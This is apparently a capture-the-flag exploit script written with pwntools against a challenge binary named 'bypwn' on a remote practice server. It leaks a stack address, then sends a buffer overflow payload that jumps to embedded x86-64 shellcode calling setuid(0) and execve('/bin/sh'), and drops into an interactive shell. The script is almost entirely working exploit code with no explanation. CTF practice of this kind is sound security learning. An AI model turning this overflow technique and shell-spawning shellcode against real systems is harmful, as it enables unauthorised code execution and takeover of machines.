#coding:utf-8
from pwn import *

context.log_level='debug'

elf = ELF('./bypwn')

#p = process('./bypwn')
p = remote("node4.buuoj.cn","28429")
shellcode = "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#attach(p,'b *0x00000000004008B3')


p.recvuntil('well you input:\n')
p.sendline('a'*32)

rbp = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print "rbp=>"+hex(rbp)

p.recvuntil('EASY PWN PWN PWN~\n')
payload = 'a'*72+'a'*8+'junkjunk' + p64(rbp+0x18)+'abcdabcd'+shellcode
p.sendline(payload)
pause()
p.interactive()